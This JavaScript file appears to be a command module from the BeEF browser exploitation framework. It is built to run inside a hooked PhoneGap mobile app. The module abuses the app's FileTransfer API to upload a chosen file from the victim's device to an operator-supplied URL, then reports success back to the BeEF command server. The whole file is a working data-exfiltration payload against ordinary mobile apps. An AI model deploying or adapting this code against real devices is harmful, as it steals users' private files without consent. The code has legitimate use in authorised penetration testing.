//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
// phonegap_upload
//
beef.execute(function() {
    var result = 'unchanged';
    
    // TODO return result to beef
    function win(r) {
        //alert(r.response);
        result = 'success';
    }
   
    // TODO return result to beef
    function fail(error) {
        //alert('error! errocode =' + error.code);
        result = 'fail';
    }   

    // (ab)use phonegap api to upload file
    function beef_upload(file_path, upload_url) {

        var options = new FileUploadOptions();
        options.fileKey="content";

        // grab filename from the filepath 
        re = new RegExp("([^/]*)$");
        options.fileName = file_path.match(re)[0];
        //options.fileName="myrecording.wav";// TODO grab from filepath
        
        // needed?
        var params = new Object();
        params.value1 = "test";
        params.value2 = "param";
        options.params = params;
        // needed?
        
        var ft = new FileTransfer();
        ft.upload(file_path, upload_url, win, fail, options);
    }

    beef_upload('<%== @file_upload_src %>', '<%== @file_upload_dst %>');
    
    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result ); // move this to inside beef_upload
});
